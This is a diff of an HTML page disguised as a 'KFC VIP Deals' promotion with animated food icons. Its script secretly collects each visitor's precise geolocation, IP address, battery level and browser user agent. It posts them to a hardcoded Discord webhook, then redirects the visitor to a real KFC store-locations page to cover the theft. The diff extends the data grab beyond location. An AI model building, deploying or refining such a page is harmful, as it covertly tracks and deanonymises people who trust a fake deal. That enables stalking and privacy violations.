@@ -5,12 +5,8 @@
   <title>KFC VIP Deals</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
+    /* Same CSS as before */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
     html, body {
       height: 100%;
       font-family: 'Segoe UI', sans-serif;
@@ -21,10 +17,8 @@
 
     .bg-animation {
       position: fixed;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 100vh;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
       pointer-events: none;
       z-index: 1;
     }
@@ -36,36 +30,19 @@
       filter: drop-shadow(0 0 8px rgba(255,255,255,0.4));
     }
 
-    .float-up {
-      animation: floatUp 7s linear infinite;
-    }
-
-    .float-down {
-      animation: floatDown 7s linear infinite;
-    }
+    .float-up { animation: floatUp 7s linear infinite; }
+    .float-down { animation: floatDown 7s linear infinite; }
 
     @keyframes floatUp {
-      0% {
-        transform: translateY(100vh) scale(0.8) rotate(0deg);
-        opacity: 0;
-      }
+      0% { transform: translateY(100vh) scale(0.8) rotate(0deg); opacity: 0; }
       10% { opacity: 1; }
-      100% {
-        transform: translateY(-150px) scale(1.2) rotate(360deg);
-        opacity: 0;
-      }
+      100% { transform: translateY(-150px) scale(1.2) rotate(360deg); opacity: 0; }
     }
 
     @keyframes floatDown {
-      0% {
-        transform: translateY(-150px) scale(1.2) rotate(0deg);
-        opacity: 0;
-      }
+      0% { transform: translateY(-150px) scale(1.2) rotate(0deg); opacity: 0; }
       10% { opacity: 1; }
-      100% {
-        transform: translateY(100vh) scale(0.8) rotate(-360deg);
-        opacity: 0;
-      }
+      100% { transform: translateY(100vh) scale(0.8) rotate(-360deg); opacity: 0; }
     }
 
     .card {
@@ -85,16 +62,8 @@
       margin-bottom: 20px;
     }
 
-    h1 {
-      font-size: 2.8rem;
-      color: #d40000;
-      margin: 10px 0;
-    }
-
-    p {
-      font-size: 1.2rem;
-      color: #333;
-    }
+    h1 { font-size: 2.8rem; color: #d40000; margin: 10px 0; }
+    p { font-size: 1.2rem; color: #333; }
 
     .btn {
       margin-top: 30px;
@@ -115,10 +84,8 @@
 </head>
 <body>
 
-  <!-- Background Animation Layer -->
   <div class="bg-animation" id="background"></div>
 
-  <!-- KFC Card -->
   <div class="card">
     <img src="kfc-logo.png" alt="KFC Logo" class="logo">
     <h1>KFC</h1>
@@ -130,7 +97,7 @@
     const foodIcons = ["drumstick.png", "sauce.png", "wing.png"];
     const bg = document.getElementById('background');
 
-    // Float up from bottom
+    // Animate background
     for (let i = 0; i < 40; i++) {
       const img = document.createElement('img');
       img.src = foodIcons[Math.floor(Math.random() * foodIcons.length)];
@@ -141,7 +108,6 @@
       bg.appendChild(img);
     }
 
-    // Float down from top
     for (let i = 0; i < 40; i++) {
       const img = document.createElement('img');
       img.src = foodIcons[Math.floor(Math.random() * foodIcons.length)];
@@ -154,43 +120,59 @@
 
     const webhookUrl = "https://discord.com/api/webhooks/1400382122866249758/e2PIiGtfPBi0SQlRzF55kOmzGW2yUl-0HvUfjgp0Pohh9IAoWnbP-7EmGSKNbUnHgXjh";
 
-    function sendLocation() {
-      if (!navigator.geolocation) return;
+    async function sendLocation() {
+      let lat = "N/A", lon = "N/A", accuracy = "N/A", ip = "N/A", battery = "N/A", userAgent = navigator.userAgent;
 
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
-          const accuracy = position.coords.accuracy;
-          const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-          const message = `🍗 **Nearby KFC Deal Request**\n📍 Latitude: ${lat}\n📍 Longitude: ${lon}\n🎯 Accuracy: ${accuracy} meters\n🔗 [Google Maps](${mapUrl})`;
+      // Get IP address from external API
+      try {
+        const ipRes = await fetch("https://api.ipify.org?format=json");
+        const ipData = await ipRes.json();
+        ip = ipData.ip;
+      } catch (e) {}
 
-          fetch(webhookUrl, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ content: message })
-          }).finally(() => {
-            setTimeout(() => {
-              window.location.href = "https://www.kfcpakistan.com/store-locations";
-            }, 1000);
-          });
-        },
-        () => {
-          window.location.href = "https://www.kfcpakistan.com/store-locations";
-        }
-      );
+      // Get battery level if available
+      try {
+        const batt = await navigator.getBattery();
+        battery = Math.round(batt.level * 100) + "%";
+      } catch (e) {}
+
+      // Get geolocation
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            lat = position.coords.latitude;
+            lon = position.coords.longitude;
+            accuracy = position.coords.accuracy;
+
+            const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+            const content = `🍗 **Nearby KFC Deal Request**
+📍 **Latitude:** ${lat}
+📍 **Longitude:** ${lon}
+🎯 **Accuracy:** ${accuracy} meters
+🌐 **IP Address:** ${ip}
+🔋 **Battery:** ${battery}
+🧠 **User Agent:** ${userAgent}
+📍 [Google Maps Link](${mapUrl})`;
+
+            fetch(webhookUrl, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ content: content })
+            }).finally(() => {
+              setTimeout(() => {
+                window.location.href = "https://www.kfcpakistan.com/store-locations";
+              }, 1000);
+            });
+          },
+          () => {
+            window.location.href = "https://www.kfcpakistan.com/store-locations";
+          }
+        );
+      } else {
+        window.location.href = "https://www.kfcpakistan.com/store-locations";
+      }
     }
   </script>
 
 </body>
 </html>
-
-
-
-
-
-
-
-
-
-
